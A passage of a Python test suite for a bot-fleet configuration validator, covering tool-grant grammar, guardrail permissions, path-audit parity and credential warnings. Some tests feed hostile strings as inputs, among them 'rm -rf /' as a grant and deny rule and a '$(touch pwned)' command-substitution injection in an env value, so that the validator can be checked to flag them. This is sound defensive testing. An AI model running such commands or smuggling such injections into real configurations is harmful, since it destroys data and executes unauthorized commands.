        """A bot without autonomous_runner produces no autonomous_runner warnings."""
        self._env_patch(monkeypatch)
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        assert not any("autonomous_runner" in w for w in report.warnings)
        assert not any("autonomous_runner" in e for e in report.errors)


class TestToolGrantsValidation:
    """validator warns on mcp-grants-without-integration-tool_grants and malformed tool_grants."""

    def _env(self, monkeypatch):
        monkeypatch.setenv("GITHUB_PAT", "ghp_test")
        monkeypatch.setenv("TELEGRAM_TOKEN_LEAD", "1:a")
        monkeypatch.setenv("TELEGRAM_TOKEN_WORKER1", "2:b")

    def _give_lead_github_mcp(self, fleet_dir: Path) -> None:
        y = (
            (fleet_dir / "fleet.yaml")
            .read_text()
            .replace(
                "expertise: [orchestration]",
                "expertise: [orchestration]\n      mcp: [github]",
            )
        )
        (fleet_dir / "fleet.yaml").write_text(y)

    def _set_github_contract(self, fleet_dir: Path, tools: list[str]) -> None:
        import json

        p = fleet_dir / "library" / "mcp" / "github.json"
        frag = json.loads(p.read_text())
        frag["_permissions_contract"] = {"tools": tools}
        p.write_text(json.dumps(frag))

    def _write_github_integration(self, fleet_dir: Path, tool_grants_yaml: str) -> None:
        (fleet_dir / "library" / "integrations" / "github.md").write_text(
            "---\ntitle: GitHub\n" + tool_grants_yaml + "---\n\n# GitHub\n"
        )

    def test_mcp_with_contract_but_no_tool_grants_warns(self, fleet_dir, monkeypatch):
        self._env(monkeypatch)
        self._give_lead_github_mcp(fleet_dir)
        self._set_github_contract(fleet_dir, ["search_code"])  # fragment grants tools
        # github.md (fixture) has env_contract but no tool_grants → migration gap
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        report = validate(fleet, _make_paths(fleet_dir))
        assert any("tool_grants" in w and "github" in w for w in report.warnings)

    def test_empty_contract_no_missing_grant_warning(self, fleet_dir, monkeypatch):
        self._env(monkeypatch)
        self._give_lead_github_mcp(fleet_dir)
        self._set_github_contract(fleet_dir, [])  # empty contract → nothing to migrate
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        report = validate(fleet, _make_paths(fleet_dir))
        assert not any("tool_grants" in w for w in report.warnings)

    def test_malformed_mid_string_wildcard_warns(self, fleet_dir, monkeypatch):
        self._env(monkeypatch)
        self._give_lead_github_mcp(fleet_dir)
        self._write_github_integration(
            fleet_dir, 'tool_grants:\n  - "mcp__git*hub__*"\n'
        )
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        report = validate(fleet, _make_paths(fleet_dir))
        assert any("malformed" in w and "mcp__git*hub__*" in w for w in report.warnings)

    def test_bash_grant_on_integration_not_malformed(self, fleet_dir, monkeypatch):
        # F3(a): the grammar accepts Bash(...) grants — no longer "malformed".
        self._env(monkeypatch)
        self._give_lead_github_mcp(fleet_dir)
        self._write_github_integration(fleet_dir, 'tool_grants:\n  - "Bash(git *)"\n')
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        report = validate(fleet, _make_paths(fleet_dir))
        assert not any("malformed" in w for w in report.warnings)

    def test_unparseable_grant_still_warns(self, fleet_dir, monkeypatch):
        # Not an mcp glob, not Bash(...), not a bare tool name → still malformed.
        self._env(monkeypatch)
        self._give_lead_github_mcp(fleet_dir)
        self._write_github_integration(fleet_dir, 'tool_grants:\n  - "rm -rf /"\n')
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        report = validate(fleet, _make_paths(fleet_dir))
        assert any("malformed" in w and "rm -rf /" in w for w in report.warnings)

    def test_valid_tool_grants_no_warning(self, fleet_dir, monkeypatch):
        self._env(monkeypatch)
        self._give_lead_github_mcp(fleet_dir)
        self._set_github_contract(fleet_dir, ["search_code"])
        self._write_github_integration(
            fleet_dir, 'tool_grants:\n  - "mcp__github__*"\n'
        )
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        report = validate(fleet, _make_paths(fleet_dir))
        assert not any("tool_grants" in w for w in report.warnings)
        assert not any("malformed" in w for w in report.warnings)

    def _write_nested_integration(self, fleet_dir, folder, name, tool_grants_yaml):
        d = fleet_dir / "library" / "integrations" / folder
        d.mkdir(parents=True, exist_ok=True)
        (d / f"{name}.md").write_text(
            f"---\ntitle: {name}\n{tool_grants_yaml}---\n\n# {name}\n"
        )

    def _equip_lead_integration(self, fleet_dir, integ):
        y = (
            (fleet_dir / "fleet.yaml")
            .read_text()
            .replace(
                "expertise: [orchestration]",
                f"expertise: [orchestration]\n      integrations: [{integ}]",
            )
        )
        (fleet_dir / "fleet.yaml").write_text(y)

    def test_integration_folder_expansion_grant_validated(self, fleet_dir, monkeypatch):
        # A malformed grant nested in a dir/ folder-expansion integration must
        # still warn — the same bypass alex closed for skills/guardrails, which
        # the integration grant loop still had (rajan's follow-up).
        self._env(monkeypatch)
        self._write_nested_integration(
            fleet_dir, "iexpand", "nested", 'tool_grants:\n  - "rm -rf /"\n'
        )
        self._equip_lead_integration(fleet_dir, "iexpand/")
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        report = validate(fleet, _make_paths(fleet_dir))
        assert any("malformed" in w and "rm -rf /" in w for w in report.warnings)


class TestGrantGrammar:
    """F3(a): a well-formed grant is an mcp__ glob, a Bash(...) pattern, or a bare tool name."""

    @pytest.mark.parametrize(
        "grant",
        [
            "mcp__github__*",
            "mcp__github__create_issue",
            "mcp__claude_ai_Gmail__*",
            "Bash(git *)",
            "Bash(npm test)",
            "Bash(git * main)",
            "Bash",  # bare Bash is shape-valid; scoping is a separate warning
            "Read",
            "Write",
            "WebFetch",
            "NotebookEdit",
            "Agent",
        ],
    )
    def test_wellformed_grants(self, grant):
        assert _grant_wellformed(grant) is True

    @pytest.mark.parametrize(
        "grant",
        [
            "mcp__git*hub__*",  # mid-string wildcard (F5)
            "mcp__github__create_*_issue",  # mid-string wildcard
            "rm -rf /",  # not a tool at all
            "git commit",  # unscoped shell, not wrapped in Bash(...)
            "read",  # bare tool must be Capitalized
            "webFetch",  # lowercase leader
            "Bash()",  # empty Bash pattern
            "",  # empty
            "  ",  # whitespace only
        ],
    )
    def test_malformed_grants(self, grant):
        assert _grant_wellformed(grant) is False

    def test_non_string_is_malformed(self):
        assert _grant_wellformed(123) is False
        assert _grant_wellformed(None) is False
        assert _grant_wellformed(["mcp__x__*"]) is False


class TestSkillGuardrailGrantValidation:
    """Skills declare additive tool_grants; guardrails declare deny-capable permissions.
    The validator checks both against the F3(a) grammar and flags bare 'Bash' allows."""

    def _env(self, monkeypatch):
        monkeypatch.setenv("GITHUB_PAT", "ghp_test")
        monkeypatch.setenv("TELEGRAM_TOKEN_LEAD", "1:a")
        monkeypatch.setenv("TELEGRAM_TOKEN_WORKER1", "2:b")

    def _equip_worker_skill(self, fleet_dir, skill):
        y = (
            (fleet_dir / "fleet.yaml")
            .read_text()
            .replace(
                "expertise: [software-engineering]",
                f"expertise: [software-engineering]\n      skills: [{skill}]",
            )
        )
        (fleet_dir / "fleet.yaml").write_text(y)

    def _write_skill(self, fleet_dir, name, tool_grants_yaml):
        d = fleet_dir / "library" / "skills" / name
        d.mkdir(parents=True, exist_ok=True)
        (d / "SKILL.md").write_text(
            f"---\nname: {name}\n{tool_grants_yaml}---\n\n# {name}\n"
        )

    def _equip_worker_guardrail(self, fleet_dir, gr):
        y = (
            (fleet_dir / "fleet.yaml")
            .read_text()
            .replace(
                "expertise: [software-engineering]",
                f"expertise: [software-engineering]\n      guardrails: [{gr}]",
            )
        )
        (fleet_dir / "fleet.yaml").write_text(y)

    def _write_guardrail(self, fleet_dir, name, perms_yaml):
        (fleet_dir / "library" / "guardrails" / f"{name}.md").write_text(
            f"---\ntitle: {name}\n{perms_yaml}---\n\n# {name}\n"
        )

    def test_skill_malformed_grant_warns(self, fleet_dir, monkeypatch):
        self._env(monkeypatch)
        self._write_skill(fleet_dir, "badskill", 'tool_grants:\n  - "rm -rf /"\n')
        self._equip_worker_skill(fleet_dir, "badskill")
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        report = validate(fleet, _make_paths(fleet_dir))
        assert any(
            "malformed" in w and "badskill" in w and "rm -rf /" in w
            for w in report.warnings
        )

    def test_skill_valid_grants_no_warning(self, fleet_dir, monkeypatch):
        self._env(monkeypatch)
        self._write_skill(
            fleet_dir, "goodskill", 'tool_grants:\n  - "Bash(git *)"\n  - "Read"\n'
        )
        self._equip_worker_skill(fleet_dir, "goodskill")
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        report = validate(fleet, _make_paths(fleet_dir))
        assert not any(
            "goodskill" in w and ("malformed" in w or "scope" in w.lower())
            for w in report.warnings
        )

    def test_skill_bare_bash_warns_scope(self, fleet_dir, monkeypatch):
        self._env(monkeypatch)
        self._write_skill(fleet_dir, "bashy", 'tool_grants:\n  - "Bash"\n')
        self._equip_worker_skill(fleet_dir, "bashy")
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        report = validate(fleet, _make_paths(fleet_dir))
        assert any("bashy" in w and "scope" in w.lower() for w in report.warnings)

    def test_guardrail_malformed_deny_warns(self, fleet_dir, monkeypatch):
        self._env(monkeypatch)
        self._write_guardrail(
            fleet_dir, "badguard", 'permissions:\n  deny: ["rm -rf /"]\n'
        )
        self._equip_worker_guardrail(fleet_dir, "badguard")
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        report = validate(fleet, _make_paths(fleet_dir))
        assert any("malformed" in w and "badguard" in w for w in report.warnings)

    def test_guardrail_valid_permissions_no_warning(self, fleet_dir, monkeypatch):
        self._env(monkeypatch)
        self._write_guardrail(
            fleet_dir,
            "okguard",
            "permissions:\n  deny: [Write, Edit]\n  allow: [Read]\n",
        )
        self._equip_worker_guardrail(fleet_dir, "okguard")
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        report = validate(fleet, _make_paths(fleet_dir))
        assert not any(
            "okguard" in w and ("malformed" in w or "scope" in w.lower())
            for w in report.warnings
        )

    def test_guardrail_deny_bare_bash_no_scope_warning(self, fleet_dir, monkeypatch):
        # Denying bare Bash is legitimate (deny-all) — must NOT trigger the scope-it warning.
        self._env(monkeypatch)
        self._write_guardrail(fleet_dir, "denybash", "permissions:\n  deny: [Bash]\n")
        self._equip_worker_guardrail(fleet_dir, "denybash")
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        report = validate(fleet, _make_paths(fleet_dir))
        assert not any(
            "denybash" in w and "scope" in w.lower() for w in report.warnings
        )

    def test_prose_only_guardrail_no_grant_warning(self, fleet_dir, monkeypatch):
        # Snowflake SELECT-only stays prose — a permissions-less guardrail warns nothing.
        self._env(monkeypatch)
        self._write_guardrail(fleet_dir, "snowflake-read-only", "")
        self._equip_worker_guardrail(fleet_dir, "snowflake-read-only")
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        report = validate(fleet, _make_paths(fleet_dir))
        assert not any(
            "snowflake-read-only" in w and ("malformed" in w or "scope" in w.lower())
            for w in report.warnings
        )

    # --- folder-expansion (dir/) equips must not bypass grant validation ---

    def _write_nested_skill(self, fleet_dir, folder, name, tool_grants_yaml):
        d = fleet_dir / "library" / "skills" / folder / name
        d.mkdir(parents=True, exist_ok=True)
        (d / "SKILL.md").write_text(
            f"---\nname: {name}\n{tool_grants_yaml}---\n\n# {name}\n"
        )

    def _write_nested_guardrail(self, fleet_dir, folder, name, perms_yaml):
        d = fleet_dir / "library" / "guardrails" / folder
        d.mkdir(parents=True, exist_ok=True)
        (d / f"{name}.md").write_text(
            f"---\ntitle: {name}\n{perms_yaml}---\n\n# {name}\n"
        )

    def test_skill_folder_expansion_grant_validated(self, fleet_dir, monkeypatch):
        # A malformed grant nested in a dir/ folder-expansion skill must still warn.
        self._env(monkeypatch)
        self._write_nested_skill(
            fleet_dir, "expandme", "nested", 'tool_grants:\n  - "rm -rf /"\n'
        )
        self._equip_worker_skill(fleet_dir, "expandme/")
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        report = validate(fleet, _make_paths(fleet_dir))
        assert any("malformed" in w and "rm -rf /" in w for w in report.warnings)

    def test_guardrail_folder_expansion_grant_validated(self, fleet_dir, monkeypatch):
        # A malformed permission nested in a dir/ folder-expansion guardrail must still warn.
        self._env(monkeypatch)
        self._write_nested_guardrail(
            fleet_dir, "gexpand", "nested", 'permissions:\n  deny: ["bad grant!"]\n'
        )
        self._equip_worker_guardrail(fleet_dir, "gexpand/")
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        report = validate(fleet, _make_paths(fleet_dir))
        assert any("malformed" in w and "bad grant!" in w for w in report.warnings)


class TestClaudronDoor:
    """The door a vault-wired bot actually walks through is the CLI (phase L1).

    The deleted check warned that a vault-wired bot had no ``claudron`` MCP
    server — a door the engine deliberately never shipped (decision C), and the
    §6 triggering example of the boundary spec. These tests pin the inversion:
    warn when the CLI door is broken, never about a missing MCP fragment.
    """

    @staticmethod
    def _env(monkeypatch):
        monkeypatch.setenv("GITHUB_PAT", "ghp_test123")
        monkeypatch.setenv("TELEGRAM_TOKEN_LEAD", "123:abc")
        monkeypatch.setenv("TELEGRAM_TOKEN_WORKER1", "456:def")

    @staticmethod
    def _wire(fleet_dir: Path, vault: Path, *, mcp: str = "") -> None:
        extra = f"\n      mcp: [{mcp}]" if mcp else ""
        text = (fleet_dir / "fleet.yaml").read_text()
        wired = text.replace(
            "    lead:\n      expertise: [orchestration]",
            "    lead:\n      expertise: [orchestration]\n"
            f"      claudron_vault_path: {vault}{extra}",
        )
        assert wired != text, "fleet.yaml fixture shape changed — wiring no-oped"
        (fleet_dir / "fleet.yaml").write_text(wired)

    @staticmethod
    def _vault(tmp_path: Path) -> Path:
        vault = tmp_path / "vault"
        (vault / "_shared").mkdir(parents=True)
        return vault

    @staticmethod
    def _cli_on_path(tmp_path: Path, monkeypatch) -> None:
        bindir = tmp_path / "bin"
        bindir.mkdir(exist_ok=True)
        stub = bindir / "claudron"
        stub.write_text("#!/bin/sh\nexit 0\n")
        stub.chmod(0o755)
        monkeypatch.setenv("PATH", f"{bindir}{os.pathsep}{os.environ['PATH']}")

    @staticmethod
    def _no_cli_on_path(tmp_path: Path, monkeypatch) -> None:
        empty = tmp_path / "empty-bin"
        empty.mkdir(exist_ok=True)
        monkeypatch.setenv("PATH", str(empty))

    def _warnings(self, fleet_dir: Path) -> list[str]:
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        return validate(fleet, _make_paths(fleet_dir)).warnings

    def test_cli_absent_warns(self, fleet_dir, tmp_path, monkeypatch):
        self._env(monkeypatch)
        self._no_cli_on_path(tmp_path, monkeypatch)
        self._wire(fleet_dir, self._vault(tmp_path))
        warnings = self._warnings(fleet_dir)
        assert any(
            "bot 'lead'" in w and "claudron CLI is not on PATH" in w for w in warnings
        ), warnings
        # The message names the door, and where the door is documented.
        assert any("docs/INTEGRATION.md" in w for w in warnings), warnings

    def test_cli_present_and_vault_valid_is_silent(
        self, fleet_dir, tmp_path, monkeypatch
    ):
        self._env(monkeypatch)
        self._cli_on_path(tmp_path, monkeypatch)
        self._wire(fleet_dir, self._vault(tmp_path))
        assert not [w for w in self._warnings(fleet_dir) if "claudron" in w.lower()], (
            self._warnings(fleet_dir)
        )

    def test_path_that_is_not_a_vault_warns(self, fleet_dir, tmp_path, monkeypatch):
        self._env(monkeypatch)
        self._cli_on_path(tmp_path, monkeypatch)
        (tmp_path / "not-a-vault").mkdir()
        self._wire(fleet_dir, tmp_path / "not-a-vault")
        warnings = self._warnings(fleet_dir)
        assert any("does not resolve to a vault" in w for w in warnings), warnings

    def test_missing_path_warns_distinctly(self, fleet_dir, tmp_path, monkeypatch):
        self._env(monkeypatch)
        self._cli_on_path(tmp_path, monkeypatch)
        self._wire(fleet_dir, tmp_path / "nowhere")
        warnings = self._warnings(fleet_dir)
        assert any("is not a directory on this host" in w for w in warnings), warnings

    def test_cli_check_is_never_an_error(self, fleet_dir, tmp_path, monkeypatch):
        """Bots can be composed before a host has the CLI — warn is the
        contract-honest level, so a broken door must never block `generate`."""
        self._env(monkeypatch)
        self._no_cli_on_path(tmp_path, monkeypatch)
        self._wire(fleet_dir, tmp_path / "nowhere")
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        report = validate(fleet, _make_paths(fleet_dir))
        assert not report.has_errors, report.errors

    @pytest.mark.parametrize("mcp", ["", "github"])
    def test_no_mcp_cross_check_in_any_combination(
        self, fleet_dir, tmp_path, monkeypatch, mcp
    ):
        """Vault-wired with no `claudron` MCP entry is the §6 triggering
        example. Neither it nor any other MCP wiring may produce a *vault*
        warning that mentions MCP at all.

        Scoped to claudron warnings deliberately: the validator legitimately
        emits unrelated MCP warnings elsewhere (e.g. a missing env var for a
        real MCP server), and asserting over every warning made this boundary
        test hostage to changes it does not govern."""
        self._env(monkeypatch)
        self._cli_on_path(tmp_path, monkeypatch)
        self._wire(fleet_dir, self._vault(tmp_path), mcp=mcp)
        for w in self._warnings(fleet_dir):
            if "claudron" in w.lower():
                assert "MCP" not in w, w

    def test_unwired_bot_gets_no_claudron_warning(
        self, fleet_dir, tmp_path, monkeypatch
    ):
        """No vault path ⇒ no door to check, even with no CLI on PATH."""
        self._env(monkeypatch)
        self._no_cli_on_path(tmp_path, monkeypatch)
        assert not [w for w in self._warnings(fleet_dir) if "claudron" in w.lower()], (
            self._warnings(fleet_dir)
        )


def test_validator_never_imports_claudron():
    """L4's boundary invariant, pinned at its first site: vault detection
    reaches the validator through paths.py's seam, never a direct import."""
    source = Path(validator_module.__file__).read_text()
    offenders = [
        line
        for line in source.splitlines()
        if re.match(r"\s*(from\s+claudron|import\s+claudron)\b", line)
    ]
    assert not offenders, offenders


class TestSourceGuardParity:
    """validate ≡ generate for the #702 L1 deny-by-default source guard — an
    unanchored, undeclared absolute in a bot source is a validate-time hard
    error, mirroring compose_bot's assert_bot_sources."""

    def _env_patch(self, monkeypatch):
        monkeypatch.setenv("GITHUB_PAT", "ghp_test")
        monkeypatch.setenv("TELEGRAM_TOKEN_LEAD", "123:abc")
        monkeypatch.setenv("TELEGRAM_TOKEN_WORKER1", "456:def")

    def test_foreign_env_absolute_is_a_validate_error(self, fleet_dir, monkeypatch):
        self._env_patch(monkeypatch)
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        fleet.bots["lead"].env = {"GA4_KEY": "/Users/x/ga4.json"}
        report = validate(fleet, _make_paths(fleet_dir))
        assert any("/Users/x/ga4.json" in e and "lead" in e for e in report.errors)

    def test_anchored_env_is_clean(self, fleet_dir, monkeypatch):
        self._env_patch(monkeypatch)
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        fleet.bots["lead"].env = {"P": "${FLEET_ROOT}/mcp/x.py"}
        report = validate(fleet, _make_paths(fleet_dir))
        assert not any("mcp/x.py" in e for e in report.errors)

    def test_declared_external_absolute_is_clean(self, fleet_dir, monkeypatch):
        from claudlobby.path_audit import ExternalDecl

        self._env_patch(monkeypatch)
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        fleet.bots["lead"].env = {"P": "/var/lib/printify/dist/index.js"}
        fleet.bots["lead"].external_paths = [
            ExternalDecl(path="/var/lib/printify/**", purpose="mount")
        ]
        report = validate(fleet, _make_paths(fleet_dir))
        assert not any("printify" in e for e in report.errors)

    def test_foreign_mcp_fragment_arg_is_a_validate_error(self, fleet_dir, monkeypatch):
        from claudlobby.config import McpEntry

        self._env_patch(monkeypatch)
        frag = {"srv": {"command": "node", "args": ["/opt/evil/index.js"]}}
        (fleet_dir / "library" / "mcp" / "evil.json").write_text(json.dumps(frag))
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        fleet.bots["lead"].mcp = [McpEntry(name="evil")]
        report = validate(fleet, _make_paths(fleet_dir))
        assert any("/opt/evil/index.js" in e for e in report.errors)

    def test_anchor_headed_env_injection_is_a_validate_error(
        self, fleet_dir, monkeypatch
    ):
        # #731 parity: the R1 anchor-headed emission would double-quote this and a
        # sourced bot.conf would execute the command substitution, so validate must
        # flag it exactly like generate (both run audit_bot_sources).
        self._env_patch(monkeypatch)
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        fleet.bots["lead"].env = {"P": "${FLEET_ROOT}/$(touch pwned)/x"}
        report = validate(fleet, _make_paths(fleet_dir))
        assert any("$(touch pwned)" in e and "lead" in e for e in report.errors)

    def test_tool_param_declared_external_is_clean(self, fleet_dir, monkeypatch):
        # #731 Fix 3: the validator must thread bot.external_paths into
        # resolve_tool_params (as composer does) — otherwise a legitimately
        # declared external path in a tool param generates cleanly but fails
        # `validate` with a false "denied absolute path". Locks that parity.
        from textwrap import dedent

        from claudlobby.config import ToolEntry
        from claudlobby.path_audit import ExternalDecl

        self._env_patch(monkeypatch)
        tool_dir = fleet_dir / "library" / "tools" / "pathtool"
        tool_dir.mkdir(parents=True)
        (tool_dir / "tool.yaml").write_text(
            dedent(
                """\
                type: script
                params:
                  path:
                    required: true
                """
            )
        )
        (tool_dir / "pathtool.py.j2").write_text("BIN = {{ path }}\n")
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        fleet.bots["lead"].tools = [
            ToolEntry(name="pathtool", params={"path": "/opt/tool/bin/run"})
        ]
        fleet.bots["lead"].external_paths = [
            ExternalDecl(path="/opt/tool/**", purpose="tool tree")
        ]
        report = validate(fleet, _make_paths(fleet_dir))
        assert not any("/opt/tool/bin/run" in e for e in report.errors)


class TestMissionFileAbsolute:
    """fleet.mission_file is composed into every bot's CLAUDE.md, so an absolute
    is a hard error (the L1 posture); project mission_file keeps the soft warn."""

    def _env_patch(self, monkeypatch):
        monkeypatch.setenv("GITHUB_PAT", "ghp_test")
        monkeypatch.setenv("TELEGRAM_TOKEN_LEAD", "123:abc")
        monkeypatch.setenv("TELEGRAM_TOKEN_WORKER1", "456:def")

    def test_fleet_mission_file_absolute_is_error(self, fleet_dir, monkeypatch):
        self._env_patch(monkeypatch)
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        fleet.mission = "Ship product that earns its keep."
        fleet.mission_file = "/abs/charter.md"
        report = validate(fleet, _make_paths(fleet_dir))
        assert any(
            "mission_file" in e and "/abs/charter.md" in e for e in report.errors
        )
        assert not any("/abs/charter.md" in w for w in report.warnings)

    def test_fleet_mission_file_relative_missing_stays_warn(
        self, fleet_dir, monkeypatch
    ):
        # The `..`/missing branches stay warnings (only the absolute case is hard).
        self._env_patch(monkeypatch)
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        fleet.mission = "Ship product that earns its keep."
        fleet.mission_file = "docs/charter.md"  # relative, does not exist
        report = validate(fleet, _make_paths(fleet_dir))
        assert any("mission_file" in w and "not found" in w for w in report.warnings)
        assert not any("mission_file" in e for e in report.errors)


class TestValidateGenerateParity:
    """#704: `validate` ≡ `generate` for the L1 deny-by-default path rule across
    EVERY choke-site. Before the fix, validate ran only ``audit_bot_sources`` (config
    leaves + MCP fragments) — a foreign absolute in a GRANT (``tool_permissions.allow``
    or an expertise/guardrail/skill/integration grant) or in a fleet TIMER script
    passed the census yet failed generate: the green-sweep-then-rollout-FAIL-storm the
    guard exists to prevent. Each test goes RED the moment validate stops mirroring the
    composer choke it covers."""

    def _load(self, fleet_dir, monkeypatch):
        # Missing env vars are warnings, not errors — the parity assertions read
        # report.errors for a specific path, so this only keeps the report tidy.
        for k, v in (
            ("GITHUB_PAT", "ghp_test123"),
            ("TELEGRAM_TOKEN_LEAD", "123:abc"),
            ("TELEGRAM_TOKEN_WORKER1", "456:def"),
        ):
            monkeypatch.setenv(k, v)
        fleet, _ = load_fleet(fleet_dir / "fleet.yaml")
        return fleet, _make_paths(fleet_dir)

    def test_validate_catches_foreign_absolute_grant(self, fleet_dir, monkeypatch):
        from claudlobby.composer import compose_settings_local
        from claudlobby.config import ToolPermissionsConfig

        fleet, paths = self._load(fleet_dir, monkeypatch)
        fleet.bots["lead"].tool_permissions = ToolPermissionsConfig(
            allow=["Read(/Users/x/secret)"]
        )
        # generate side raises (the reference behavior we mirror)...
        with pytest.raises(ValueError, match="/Users/x/secret"):
            compose_settings_local(fleet.bots["lead"], fleet, paths)
        # ...and validate now surfaces the same finding instead of passing clean.
        report = validate(fleet, paths)
        assert report.has_errors
        assert any("/Users/x/secret" in e for e in report.errors)

    def test_validate_passes_anchored_and_declared_grant(self, fleet_dir, monkeypatch):
        from claudlobby.config import ToolPermissionsConfig
        from claudlobby.path_audit import ExternalDecl

        fleet, paths = self._load(fleet_dir, monkeypatch)
        lead = fleet.bots["lead"]
        lead.tool_permissions = ToolPermissionsConfig(allow=["Bash(/opt/tool/bin *)"])
        lead.external_paths = [ExternalDecl(path="/opt/tool/**", purpose="tool tree")]
        report = validate(fleet, paths)
        assert not any("/opt/tool" in e for e in report.errors)

    def test_validate_catches_foreign_absolute_timer_script(
        self, fleet_dir, monkeypatch
    ):
        fleet, paths = self._load(fleet_dir, monkeypatch)
        fleet.defaults["jobs"] = {
            "rogue": {"script": "/opt/rogue/job.sh", "schedule": "daily"}
        }
        report = validate(fleet, paths)
        assert any("/opt/rogue/job.sh" in e for e in report.errors)

    def test_validate_passes_anchored_timer_script(self, fleet_dir, monkeypatch):
        fleet, paths = self._load(fleet_dir, monkeypatch)
        fleet.defaults["jobs"] = {
            "vitals": {"script": "$CLAUDLOBBY_ROOT/lib/x.sh", "schedule": "daily"}
        }
        report = validate(fleet, paths)
        assert not any("timer script" in e for e in report.errors)

    def test_timer_check_gated_on_emit_condition_no_false_positive(
        self, fleet_dir, monkeypatch
    ):
        # system_defaults timers OFF → the composer emits no default timers, so
        # validate must NOT flag a job generate would never check (the zero-FP bar).
        from claudlobby.config import SystemDefaultsConfig

        fleet, paths = self._load(fleet_dir, monkeypatch)
        fleet.system_defaults = SystemDefaultsConfig(timers=False)
        fleet.defaults["jobs"] = {
            "rogue": {"script": "/opt/rogue/job.sh", "schedule": "daily"}
        }
        report = validate(fleet, paths)
        assert not any("/opt/rogue/job.sh" in e for e in report.errors)


class TestGitCredentialsWarnings:
    """Per-org git credential routing has two operator-side gaps that both
    compose VALID config and then fail at runtime, so both warn (never fail):
    a declared token that is not in any .env tier, and an [include] target that
    carries no git identity. Neither is a composition error."""

    def _report(self, fleet_dir, monkeypatch, operator, creds=None):
        import claudlobby.composer as comp

        monkeypatch.setenv("GITHUB_PAT", "ghp_test123")
        monkeypatch.setenv("TELEGRAM_TOKEN_LEAD", "123:abc")
        monkeypatch.setenv("TELEGRAM_TOKEN_WORKER1", "456:def")
        monkeypatch.setattr(comp, "_operator_gitconfig", lambda: operator)
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        fleet.bots["lead"].git_credentials = (
            {"OrgA": "ORG_A_PAT"} if creds is None else creds
        )
        return validate(fleet, _make_paths(fleet_dir))

    def _identity_warnings(self, report):
        """Only the [include]/identity warning — the missing-token warning is a
        separate gap and fires independently."""
        return [
            w
            for w in report.warnings
            if "git_credentials" in w and "Author identity unknown" in w
        ]

    def _token_warnings(self, report):
        return [w for w in report.warnings if "git_credentials[" in w]

    def test_missing_operator_gitconfig_warns_never_fails(
        self, fleet_dir, tmp_path, monkeypatch
    ):
        report = self._report(fleet_dir, monkeypatch, tmp_path / "absent.gitconfig")
        warns = self._identity_warnings(report)
        assert any("does not exist" in w for w in warns), warns
        assert any("Author identity unknown" in w for w in warns), warns
        assert not report.errors

    def test_identityless_operator_gitconfig_warns(
        self, fleet_dir, tmp_path, monkeypatch
    ):
        """The file existing is not enough — a ~/.gitconfig with no user.email
        fails commits identically, and an existence check alone would miss it."""
        operator = tmp_path / "no-identity.gitconfig"
        operator.write_text("[init]\n\tdefaultBranch = main\n")
        warns = self._identity_warnings(self._report(fleet_dir, monkeypatch, operator))
        assert any("sets no user.email" in w for w in warns), warns

    def test_identity_behind_a_nested_include_is_accepted(
        self, fleet_dir, tmp_path, monkeypatch
    ):
        """Delegating the read to `git config --file` (rather than parsing the
        file) is what makes this pass: the operator's identity legitimately lives
        one [include] deeper, and a hand-rolled parse would cry wolf."""
        inner = tmp_path / "identity.gitconfig"
        inner.write_text("[user]\n\temail = operator@example.com\n")
        operator = tmp_path / "outer.gitconfig"
        operator.write_text(f"[include]\n\tpath = {inner}\n")
        report = self._report(fleet_dir, monkeypatch, operator)
        assert self._identity_warnings(report) == []

    def test_no_declaration_means_no_identity_warning(
        self, fleet_dir, tmp_path, monkeypatch
    ):
        """A fleet declaring no git_credentials must not be nagged about a host
        file it never includes."""
        report = self._report(
            fleet_dir, monkeypatch, tmp_path / "absent.gitconfig", creds={}
        )
        assert self._identity_warnings(report) == []
        assert self._token_warnings(report) == []

    def test_declared_token_missing_from_env_warns(
        self, fleet_dir, tmp_path, monkeypatch
    ):
        """A declared org whose token is unset composes routing that answers
        with an EMPTY password — git presents it and GitHub 401s; later helpers
        are never consulted (D2: declaration wins, not value — the old wording
        claimed a fall-through to the host helper that cannot happen)."""
        operator = tmp_path / "operator.gitconfig"
        operator.write_text("[user]\n\temail = operator@example.com\n")
        monkeypatch.delenv("ORG_A_PAT", raising=False)
        warns = self._token_warnings(self._report(fleet_dir, monkeypatch, operator))
        assert any(
            "ORG_A_PAT" in w and "EMPTY password" in w and "401" in w for w in warns
        ), warns


class TestEnvContractShapeGate:
    """#1214 Phase 1 — `secret` required, `source` closed at any tier.

    Errors, not warnings: a var that silently defaults to not-a-secret is the
    #1213 shape (a real credential nothing ever alerts on), and `generate`
    refuses on errors so a malformed contract cannot compose.
    """

    def _write_contract(
        self, fleet_dir: Path, contract: dict, *, name: str = "github"
    ) -> None:
        """Write the fragment. Deliberately does NOT equip it on any bot.

        The gate is at library altitude, so a fragment nobody equips is still
        checked — and the shared `fleet_dir` fixture declares no `mcp:` on any
        bot, which makes every test here an unequipped case by default.
        """
